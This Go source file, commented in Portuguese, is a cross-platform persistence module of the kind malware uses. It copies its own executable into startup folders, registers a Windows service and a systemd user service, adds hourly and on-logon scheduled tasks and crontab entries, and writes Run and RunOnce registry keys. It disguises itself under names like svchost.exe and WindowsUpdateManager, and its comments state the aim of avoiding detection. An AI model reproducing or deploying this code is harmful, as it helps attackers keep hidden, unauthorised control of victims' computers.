package main

import (
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
)

// Nomes usados para persistência
var (
	// Nomes genéricos para evitar detecção
	serviceNames = []string{"SystemNetworkService", "WindowsUpdateManager", "NetworkTimeSync"}
	execNames    = []string{"svchost.exe", "winupdate.exe", "systray.exe"}
)

// Instala persistência em vários locais
func installPersistence() {
	// Obtém o executável atual
	exePath, err := os.Executable()
	if err != nil {
		fmt.Printf("⚠️ Erro ao obter caminho executável: %v\n", err)
		return
	}

	// 1. Método 1: Copiar para pasta de startup
	installStartupMethod(exePath)

	// 2. Método 2: Instalar como serviço do sistema
	installAsService(exePath)

	// 3. Método 3: Criar tarefa agendada
	createScheduledTask(exePath)

	// 4. Método 4: Modificar registro (Windows)
	if runtime.GOOS == "windows" {
		addToRegistry(exePath)
	}

	fmt.Println("✅ Persistência instalada com sucesso")
}

// Copia para pasta de inicialização do sistema
func installStartupMethod(exePath string) {
	var startupDir string

	// Determina pasta de startup baseado no OS
	switch runtime.GOOS {
	case "windows":
		// %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
		appData := os.Getenv("APPDATA")
		startupDir = filepath.Join(appData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
	case "linux":
		// ~/.config/autostart
		homeDir, _ := os.UserHomeDir()
		startupDir = filepath.Join(homeDir, ".config", "autostart")
		os.MkdirAll(startupDir, 0755)
	case "darwin":
		// ~/Library/LaunchAgents
		homeDir, _ := os.UserHomeDir()
		startupDir = filepath.Join(homeDir, "Library", "LaunchAgents")
	}

	if startupDir != "" {
		// Nome de arquivo genérico para discrição
		destFile := filepath.Join(startupDir, execNames[0])

		// Copia o executável para a pasta de inicialização
		copyFile(exePath, destFile)
		os.Chmod(destFile, 0755)

		if runtime.GOOS == "linux" {
			// Para Linux, cria também um arquivo .desktop
			desktopFile := filepath.Join(startupDir, "system-monitor.desktop")
			content := `[Desktop Entry]
Type=Application
Name=System Monitor
Exec=` + destFile + `
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true`
			os.WriteFile(desktopFile, []byte(content), 0644)
		}
	}
}

// Instala como serviço do sistema
func installAsService(exePath string) {
	switch runtime.GOOS {
	case "windows":
		// Instala como serviço Windows usando SC
		serviceCmd := fmt.Sprintf(`sc create "%s" binPath= "%s" start= auto DisplayName= "%s"`,
			serviceNames[0], exePath, "Windows Network Management")
		runCommand(serviceCmd)

	case "linux":
		// Cria um serviço systemd
		homeDir, _ := os.UserHomeDir()
		serviceFile := filepath.Join(homeDir, ".config", "systemd", "user", "network-service.service")
		os.MkdirAll(filepath.Dir(serviceFile), 0755)

		serviceContent := `[Unit]
Description=System Network Service
After=network.target

[Service]
ExecStart=` + exePath + `
Restart=always
RestartSec=10

[Install]
WantedBy=default.target`

		os.WriteFile(serviceFile, []byte(serviceContent), 0644)
		runCommand("systemctl --user enable network-service")
	}
}

// Cria tarefa agendada que executa periodicamente
func createScheduledTask(exePath string) {
	if runtime.GOOS == "windows" {
		// Cria tarefa agendada usando schtasks
		taskCmd := fmt.Sprintf(`schtasks /create /tn "%s" /tr "%s" /sc HOURLY /mo 1 /F`,
			"WindowsSystemUpdate", exePath)
		runCommand(taskCmd)

		// Cria uma segunda tarefa com outro nome para redundância
		taskCmd = fmt.Sprintf(`schtasks /create /tn "%s" /tr "%s" /sc ONLOGON /F`,
			"NetworkTimeSync", exePath)
		runCommand(taskCmd)
	} else if runtime.GOOS == "linux" {
		// Adiciona ao crontab do usuário
		cronCmd := fmt.Sprintf(`(crontab -l 2>/dev/null; echo "@hourly %s") | crontab -`, exePath)
		runCommand(cronCmd)
	}
}

// Adiciona ao registro do Windows para persistência
func addToRegistry(exePath string) {
	// Adiciona ao HKCU\Software\Microsoft\Windows\CurrentVersion\Run
	regCmd := fmt.Sprintf(`reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "%s" /t REG_SZ /d "%s" /f`,
		serviceNames[1], exePath)
	runCommand(regCmd)

	// Adiciona uma segunda entrada para redundância
	regCmd = fmt.Sprintf(`reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "%s" /t REG_SZ /d "%s" /f`,
		serviceNames[2], exePath)
	runCommand(regCmd)
}

// Função auxiliar para copiar arquivo
func copyFile(src, dst string) error {
	sourceFile, err := os.Open(src)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	destFile, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer destFile.Close()

	_, err = io.Copy(destFile, sourceFile)
	return err
}

// Função auxiliar para executar comandos
func runCommand(cmdStr string) {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", cmdStr)
	} else {
		cmd = exec.Command("sh", "-c", cmdStr)
	}
	cmd.Run() // Ignora erros para não interromper o fluxo
}
